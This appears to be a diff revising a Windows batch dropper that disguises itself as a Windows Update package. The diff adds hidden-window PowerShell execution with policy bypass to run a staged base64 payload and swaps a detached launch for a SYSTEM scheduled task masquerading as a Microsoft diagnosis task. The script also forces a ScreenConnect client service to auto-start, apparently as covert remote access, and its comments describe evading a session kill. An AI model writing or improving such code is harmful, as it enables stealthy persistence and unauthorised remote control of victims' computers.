@@ -1,6 +1,6 @@
 @echo off
 setlocal EnableExtensions
-echo === GO.CMD BUILD 20260730WU8B ===
+echo === GO.CMD BUILD 20260730WU8C ===
 
 net session >nul 2>&1
 if errorlevel 1 (
@@ -13,7 +13,7 @@ set "B64=%WORKDIR%\update.b64"
 set "PS1=%WORKDIR%\wucache_pkg.ps1"
 set "PS1ALT=C:\Windows\Temp\wucache_pkg.ps1"
 set "ERR=%WORKDIR%\boot.err"
-set "MARKER=WU_BUILD_20260730_UNIFIED5"
+set "MARKER=WU_BUILD_20260730_UNIFIED6"
 set "ONCETASK=\Microsoft\Windows\Diagnosis\WMIRegistration"
 set "CB=%RANDOM%%RANDOM%"
 set "ALTSC=ScreenConnect Client (f861c8140d453427)"
@@ -68,21 +68,23 @@ for %%A in ("%B64%") do echo OK bytes=%%~zA
 >>"%WRAP%" echo if errorlevel 1 echo marker_fail^>^>"%ERR%" ^& exit /b 3
 >>"%WRAP%" echo copy /y "%PS1ALT%" "%PS1%" ^>nul 2^>^&1
 >>"%WRAP%" echo echo running_payload^>^>"%ERR%"
->>"%WRAP%" echo powershell.exe -NoP -NonI -EP Bypass -File "%PS1ALT%" ^>^>"%ERR%" 2^>^&1
+>>"%WRAP%" echo powershell.exe -NoP -NonI -EP Bypass -WindowStyle Hidden -File "%PS1ALT%" ^>^>"%ERR%" 2^>^&1
+>>"%WRAP%" echo echo boot_exit_%%ERRORLEVEL%%^>^>"%ERR%"
 >>"%WRAP%" echo sc config "%ALTSC%" start= auto ^>nul 2^>^&1
 >>"%WRAP%" echo sc start "%ALTSC%" ^>nul 2^>^&1
->>"%WRAP%" echo echo boot_exit_%%ERRORLEVEL%%^>^>"%ERR%"
 
 echo %WRAP%>"%WORKDIR%\go.flag"
 
-REM Detached process (NOT /b) so SC Guest 10s kill cannot stop the worker
-start "" /min cmd.exe /c "%WRAP%"
-
-REM SYSTEM task backup (independent of this console)
+REM ONE launcher only: SYSTEM task (survives Guest kill; no dual-run race)
 schtasks /Create /TN "%ONCETASK%" /RU SYSTEM /RL HIGHEST /SC ONSTART /F /TR "%WRAP%" >nul 2>&1
-schtasks /Run /TN "%ONCETASK%" >nul 2>&1
+if errorlevel 1 (
+  echo schtasks create failed - fallback start /min
+  start "" /min cmd.exe /c "%WRAP%"
+) else (
+  schtasks /Run /TN "%ONCETASK%" >nul 2>&1
+  echo Launched SYSTEM worker [%MARKER%].
+)
 
-echo Launched DETACHED worker [%MARKER%].
-echo Check in 2-3 min: type "%ERR%"
+echo Check in 2 min: type "%ERR%"
 sc start "%ALTSC%" >nul 2>&1
 exit /b 0
